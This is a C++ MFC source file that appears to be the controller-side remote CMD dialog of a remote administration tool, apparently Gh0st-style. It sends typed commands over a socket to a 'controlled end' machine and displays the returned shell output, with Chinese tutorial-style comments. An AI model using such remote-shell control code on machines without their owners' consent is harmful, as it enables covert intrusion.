// DlgCmdManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgCmdManager.h"
#include "afxdialogex.h"


// CDlgCmdManager 对话框

IMPLEMENT_DYNAMIC(CDlgCmdManager, CDialog)

CDlgCmdManager::CDlgCmdManager(CWnd * pParent, _CIOCPServer * IOCPServer, CONTEXT_OBJECT * ContextObject)
	: CDialog(IDD_DIALOG_CMD_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

	m_BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0));
}

CDlgCmdManager::~CDlgCmdManager()
{
}

void CDlgCmdManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EIDT_CMD_MANAGER_MAIN, m_CEidt_Dialog_Cmd_Manager_Main);
}


BEGIN_MESSAGE_MAP(CDlgCmdManager, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CDlgCmdManager 消息处理程序


BOOL CDlgCmdManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("%s - 远程CMD管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnPrepareSending(m_ContextObject,&IsToken,sizeof(BYTE));


	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CDlgCmdManager::OnClose()
{
	
	if (m_ContextObject!=NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		m_ContextObject->DialogHandle = NULL;
		m_ContextObject->DialogID = 0;
	}
	CDialog::OnClose();
}

void CDlgCmdManager::WindowHandleIO()
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	ShowCmdData();
	m_ShowDataLength = m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength();

}

void CDlgCmdManager::ShowCmdData()
{
	m_ContextObject->m_ReceivedDecompressdBufferData.WriteBuffer((LPBYTE)"", 1);           
	//从被控制端来的数据我们要加上一个\0
	CString v1 = (char*)m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0);
	//获得所有的数据 包括 \0															  
	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行   
	v1.Replace("\n", "\r\n");
	//得到当前窗口的字符个数
	int	BufferLength = m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength();    
	//hello//1.txt//2.txt//dir\r\n

	 //将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
	m_CEidt_Dialog_Cmd_Manager_Main.SetSel(BufferLength, BufferLength);
	//用传递过来的数据替换掉该位置的字符    //显示
	m_CEidt_Dialog_Cmd_Manager_Main.ReplaceSel(v1);
	//重新得到字符的大小
	m_911 = m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength();   //C:\>dir 
	//我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车										
	//要找到这个回车的处理我们就要到PreTranslateMessage函数的定义  
}

BOOL CDlgCmdManager::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		//将Backspace、delete屏蔽
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return TRUE;
		}
		//在Edit上按回车
		if (pMsg->wParam == VK_RETURN&&pMsg->hwnd == m_CEidt_Dialog_Cmd_Manager_Main.m_hWnd)
		{
			//得到窗口数据大小
			int BufferLength = m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength();
			CString BufferData;

			//得到窗口具体数据
			m_CEidt_Dialog_Cmd_Manager_Main.GetWindowText(BufferData);
			//加入回车换行
			BufferData += "\r\n";

			m_IOCPServer->OnPrepareSending(m_ContextObject, 
				(LPBYTE)BufferData.GetBuffer(0) + m_911, BufferData.GetLength() - m_911);
			m_911 = m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength();
		}

		//Backspace不能删除初始数据 限制VK_BACK
		if (pMsg->wParam == VK_BACK &&pMsg->hwnd == m_CEidt_Dialog_Cmd_Manager_Main.m_hWnd)
		{
			if (m_CEidt_Dialog_Cmd_Manager_Main.GetWindowTextLength() <= m_ShowDataLength)
			{
				return TRUE;
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CDlgCmdManager::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	if ((pWnd->GetDlgCtrlID() == IDC_EIDT_CMD_MANAGER_MAIN) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}
